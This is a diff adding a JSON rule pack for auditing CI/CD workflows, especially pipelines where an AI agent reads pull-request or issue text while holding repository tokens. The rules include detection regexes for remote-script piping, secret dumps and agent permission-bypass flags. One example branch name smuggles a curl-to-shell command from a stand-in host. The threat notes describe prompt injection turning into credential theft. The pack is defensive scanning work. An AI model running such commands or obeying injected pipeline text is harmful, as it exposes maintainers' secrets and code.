@@ -1,0 +1,214 @@
+{
+  "$schema": "viora-rules/1",
+  "version": "2.0.0",
+  "pack": "viora-aegis-ci",
+  "purpose": "Audit CI/CD workflows, with special attention to pipelines where an AI agent runs with repository credentials and reads attacker-controlled text.",
+  "threat": "In an agentic pipeline the untrusted input is not only a shell argument - it is the agent's instructions. A PR title becomes a prompt. If that pipeline holds a write token or a secret, prompt injection becomes code execution and credential theft.",
+  "reject_these_excuses": [
+    "'Only maintainers open PRs' - a fork PR, an issue comment or a review comment is enough for most of these triggers.",
+    "'The tool allowlist restricts it' - a wildcard, or any single shell-capable tool, defeats the allowlist.",
+    "'There is no ${{ }} in the prompt' - the agent still reads the issue body through its own API calls.",
+    "'It runs in a sandbox' - the sandbox still holds the token, and the token is the target.",
+    "'It needs a secret to be exploitable' - GITHUB_TOKEN is a secret, and it is always there."
+  ],
+  "categories": {
+    "TRIG": "Dangerous trigger and permission combinations",
+    "EXPR": "Untrusted expression interpolation",
+    "AGENT": "AI agent in CI reading untrusted input",
+    "CHK": "Untrusted code checkout and execution",
+    "SECR": "Secret exposure",
+    "PIN": "Unpinned or mutable dependencies"
+  },
+  "rules": [
+    {
+      "id": "CI-TRIG-001",
+      "title": "pull_request_target trigger",
+      "category": "TRIG",
+      "severity": "high",
+      "pattern": "pull_request_target",
+      "note": "Runs with the base repository's secrets and token, but the PR is authored by anyone. Every untrusted value in this file is now a credentialed-context input.",
+      "fp": "Safe only if the job never checks out PR code and never interpolates PR-controlled text. Prove both.",
+      "fix": "Split into an untrusted build job (pull_request, no secrets) and a trusted job triggered by workflow_run that only consumes artifacts."
+    },
+    {
+      "id": "CI-TRIG-002",
+      "title": "Comment or issue trigger",
+      "category": "TRIG",
+      "severity": "medium",
+      "pattern": "issue_comment|issues:|pull_request_review_comment|discussion_comment|workflow_run",
+      "note": "Anyone who can comment can start this workflow and control its input text.",
+      "fp": "An author-association guard limited to OWNER/MEMBER genuinely reduces this. Find the guard or report it missing.",
+      "fix": "Gate on `github.event.comment.author_association` and require an explicit command prefix."
+    },
+    {
+      "id": "CI-TRIG-003",
+      "title": "Write permissions granted",
+      "category": "TRIG",
+      "severity": "medium",
+      "pattern": "permissions:\\s*$|contents:\\s*write|pull-requests:\\s*write|packages:\\s*write|id-token:\\s*write|actions:\\s*write",
+      "note": "Defines the blast radius. `contents: write` plus any injection equals arbitrary commits. `id-token: write` reaches your cloud account.",
+      "fp": "A release workflow triggered only by a tag push needs write and takes no untrusted input.",
+      "fix": "Set `permissions: contents: read` at workflow level and widen per job only where required."
+    },
+    {
+      "id": "CI-EXPR-001",
+      "title": "Untrusted expression interpolated into a script",
+      "category": "EXPR",
+      "severity": "critical",
+      "pattern": "\\$\\{\\{\\s*github\\.event\\.(issue|pull_request|comment|discussion|review)\\.(title|body|head\\.ref|head\\.label|head\\.repo\\.[\\w.]+|user\\.login)|\\$\\{\\{\\s*github\\.head_ref|\\$\\{\\{\\s*github\\.event\\.head_commit\\.message|\\$\\{\\{\\s*inputs\\.[\\w]+\\s*\\}\\}",
+      "note": "Expressions are substituted before the shell parses the line, so a branch named `a;curl evil|sh` is a command. Classic and still everywhere.",
+      "fp": "Interpolation into an `env:` block that is then referenced as \"$VAR\" with quotes is the correct fix pattern, not a finding.",
+      "fix": "Pass through env: `env: TITLE: ${{ github.event.issue.title }}` then use \"$TITLE\" quoted in the script."
+    },
+    {
+      "id": "CI-EXPR-002",
+      "title": "Untrusted value reaches a shell through an env var without quoting",
+      "category": "EXPR",
+      "severity": "high",
+      "pattern": "\\$(TITLE|BODY|COMMENT|PR_TITLE|PR_BODY|BRANCH|HEAD_REF|ISSUE_TITLE|ISSUE_BODY|USER_INPUT|PROMPT)\\b(?![\"'])",
+      "note": "The env-var indirection only works if the expansion is quoted. Unquoted, word splitting and globbing return.",
+      "fp": "Inside a single-quoted heredoc or a non-shell step this does not expand.",
+      "fix": "Always write \"$VAR\" with double quotes."
+    },
+    {
+      "id": "CI-EXPR-003",
+      "title": "Command substitution over environment or event data",
+      "category": "EXPR",
+      "severity": "high",
+      "pattern": "\\$\\((env|printenv|cat\\s+[^)]*event|gh\\s+(issue|pr)\\s+view)[^)]*\\)|`(env|printenv)`",
+      "note": "Evaluates untrusted text in a subshell, and often dumps the whole environment - which is where the secrets are.",
+      "fp": "None worth defending in a credentialed workflow.",
+      "fix": "Read the value with the API into a file and parse the file; never through a subshell."
+    },
+    {
+      "id": "CI-AGENT-001",
+      "title": "AI agent invoked in CI",
+      "category": "AGENT",
+      "severity": "medium",
+      "pattern": "(?i)anthropics/claude-code-action|claude-code|openai/codex|codex-action|gemini-cli|google-github-actions/run-gemini|aider|sweep-ai|devin|cursor-agent|opendevin|autogpt|@anthropic-ai/claude-code|copilot-agent",
+      "note": "Establishes that an agent runs here. Now answer three questions: what untrusted text can it read, what tools can it call, and what credentials does the job hold?",
+      "fp": "An agent job triggered only by manual workflow_dispatch from a maintainer with read-only permissions.",
+      "fix": "Give the agent job read-only permissions, no long-lived secrets, and an explicit non-wildcard tool allowlist."
+    },
+    {
+      "id": "CI-AGENT-002",
+      "title": "Untrusted text placed directly in an agent prompt",
+      "category": "AGENT",
+      "severity": "critical",
+      "pattern": "(?i)(prompt|direct_prompt|instructions|user_message|query|task)\\s*:[^\\n]{0,200}(\\$\\{\\{\\s*github\\.event|\\$\\{\\{\\s*github\\.head_ref|\\$(TITLE|BODY|COMMENT|PR_BODY|ISSUE_BODY))",
+      "note": "The attacker is writing the agent's instructions. There is no escaping that fixes this - prompts have no quoting layer.",
+      "fp": "None. Even a 'summarise this' prompt is exploitable once the agent has a token.",
+      "fix": "Have the agent fetch the text itself into a file, label it as untrusted data in the prompt, and drop write permissions."
+    },
+    {
+      "id": "CI-AGENT-003",
+      "title": "Agent granted unrestricted tools",
+      "category": "AGENT",
+      "severity": "critical",
+      "pattern": "(?i)(allowed[_-]?tools|tools|claude_args)\\s*:[^\\n]{0,160}(\\*|Bash\\s*\\(\\s*\\*|--dangerously-skip-permissions|--yolo|danger-full-access|bypassPermissions|--allowedTools\\s+\\*)",
+      "note": "A wildcard or a shell tool means the injection has a shell. The allowlist is the only thing between the prompt and the token.",
+      "fp": "None. Name the exact tools the job needs instead.",
+      "fix": "Enumerate tools explicitly, e.g. `Read,Grep,Glob`. Never grant Bash in a job that reads untrusted text."
+    },
+    {
+      "id": "CI-AGENT-004",
+      "title": "Agent output executed or evaluated",
+      "category": "AGENT",
+      "severity": "critical",
+      "pattern": "(?i)(claude|codex|gemini|agent|llm|ai)[\\w.\\-]*(output|result|response|stdout)[^\\n]{0,60}(\\|\\s*(sh|bash|python3?|node)|eval|exec\\s|\\$\\()|(eval|bash|sh)\\s+[\"']?\\$\\{?\\{?\\s*steps\\.[\\w\\-]*(claude|codex|gemini|ai|agent)",
+      "note": "Model output is untrusted output (Law 1). Piping it to a shell turns a suggestion into execution.",
+      "fp": "None.",
+      "fix": "Write agent output to an artifact and require a human to review it before anything runs."
+    },
+    {
+      "id": "CI-AGENT-005",
+      "title": "Agent job holds a long-lived secret",
+      "category": "AGENT",
+      "severity": "high",
+      "pattern": "(?i)(NPM_TOKEN|PYPI_TOKEN|DOCKER(HUB)?_(TOKEN|PASSWORD)|AWS_SECRET_ACCESS_KEY|GCP_SA_KEY|AZURE_CREDENTIALS|SSH_PRIVATE_KEY|GH_PAT|PERSONAL_ACCESS_TOKEN|CODECOV_TOKEN|SLACK_WEBHOOK)",
+      "note": "Anything in the job environment is reachable by anything the agent runs. Inventory every secret in an agent job.",
+      "fp": "A publish job with no agent and no untrusted input.",
+      "fix": "Move privileged steps into a separate job with no agent and no untrusted input; use OIDC short-lived credentials."
+    },
+    {
+      "id": "CI-CHK-001",
+      "title": "Checkout of PR head in a credentialed workflow",
+      "category": "CHK",
+      "severity": "critical",
+      "pattern": "ref:\\s*\\$\\{\\{\\s*github\\.event\\.pull_request\\.head\\.(sha|ref)|ref:\\s*\\$\\{\\{\\s*github\\.event\\.pull_request\\.merge_commit_sha|repository:\\s*\\$\\{\\{\\s*github\\.event\\.pull_request\\.head\\.repo\\.full_name",
+      "note": "Only a finding when paired with pull_request_target or a comment trigger - then attacker code runs with your secrets. Check the trigger first.",
+      "fp": "With a plain `pull_request` trigger this is the normal, safe pattern.",
+      "fix": "Never combine PR-head checkout with pull_request_target. Use the two-job artifact handoff."
+    },
+    {
+      "id": "CI-CHK-002",
+      "title": "Build or install step runs untrusted code",
+      "category": "CHK",
+      "severity": "high",
+      "pattern": "npm\\s+(ci|install|i)\\b(?![^\\n]*--ignore-scripts)|yarn\\s+install(?![^\\n]*--ignore-scripts)|pnpm\\s+install(?![^\\n]*--ignore-scripts)|pip\\s+install\\s+-r|make\\b|\\bgradlew?\\b|mvn\\s|cargo\\s+(build|test)|go\\s+generate",
+      "note": "Lifecycle scripts, Makefiles and build plugins are code from the checked-out tree. In a credentialed job that is arbitrary execution.",
+      "fp": "Fine in an uncredentialed pull_request job. Judge it together with the trigger and permissions.",
+      "fix": "Use `npm ci --ignore-scripts` in credentialed jobs and move the build to the untrusted job."
+    },
+    {
+      "id": "CI-SECR-001",
+      "title": "Whole secret context or environment exposed",
+      "category": "SECR",
+      "severity": "high",
+      "pattern": "toJSON\\s*\\(\\s*secrets\\s*\\)|\\$\\{\\{\\s*secrets\\s*\\}\\}|env\\s*\\|\\s*(sort|base64|curl)|printenv\\s*\\|",
+      "note": "Dumps every secret into the log or the network. Masking is best-effort and base64 defeats it.",
+      "fp": "None.",
+      "fix": "Reference secrets individually, only in the step that needs them."
+    },
+    {
+      "id": "CI-SECR-002",
+      "title": "Secret passed on a command line",
+      "category": "SECR",
+      "severity": "medium",
+      "pattern": "(--(token|password|api-?key|secret)[= ]|-p\\s*)\\$\\{\\{\\s*secrets\\.",
+      "note": "Command lines are visible to other processes and are often echoed by set -x.",
+      "fp": "Some tools have no env-var alternative. Say so explicitly if that is the case.",
+      "fix": "Pass secrets via env: or stdin instead of argv."
+    },
+    {
+      "id": "CI-SECR-003",
+      "title": "Secret written into an output or artifact",
+      "category": "SECR",
+      "severity": "high",
+      "pattern": "(?i)(echo|printf)[^\\n]{0,60}\\$\\{\\{\\s*secrets\\.[^\\n]{0,60}(>>?\\s*\\$GITHUB_(OUTPUT|ENV|STEP_SUMMARY)|>\\s*[\\w./\\-]+)",
+      "note": "Step outputs and artifacts outlive the step and are readable by later jobs and often by forks.",
+      "fp": "None.",
+      "fix": "Keep secrets in the process environment; never persist them."
+    },
+    {
+      "id": "CI-PIN-001",
+      "title": "Third-party action pinned to a mutable ref",
+      "category": "PIN",
+      "severity": "medium",
+      "pattern": "uses:\\s*(?!actions/|github/|\\./)[\\w.\\-]+/[\\w.\\-]+@(main|master|latest|v?\\d+(\\.\\d+)*)\\s*$",
+      "note": "A tag can be moved. Whoever owns that repository can change what runs in your credentialed job at any time.",
+      "fp": "First-party actions/* are excluded by convention; a vendored local action with ./ is fine.",
+      "fix": "Pin to a full 40-character commit SHA with the version in a trailing comment."
+    },
+    {
+      "id": "CI-PIN-002",
+      "title": "Remote script downloaded and executed",
+      "category": "PIN",
+      "severity": "high",
+      "pattern": "(?i)\\b(curl|wget|iwr)\\b[^\\n|]{0,160}\\|\\s*(sudo\\s+)?(sh|bash|python3?|node|pwsh)\\b",
+      "note": "Unreviewed, unpinned remote code with the job's full credentials.",
+      "fp": "None. Even official installers should be pinned and checksummed.",
+      "fix": "Vendor the installer, pin a version, and verify a checksum before running it."
+    },
+    {
+      "id": "CI-PIN-003",
+      "title": "Self-hosted runner",
+      "category": "PIN",
+      "severity": "medium",
+      "pattern": "runs-on:\\s*\\[?\\s*self-hosted",
+      "note": "State persists between jobs and the machine sits inside your network. Combined with untrusted code this is lateral movement.",
+      "fp": "Ephemeral, single-use runners in an isolated network materially reduce this.",
+      "fix": "Use ephemeral runners and never expose them to fork PRs."
+    }
+  ]
+}
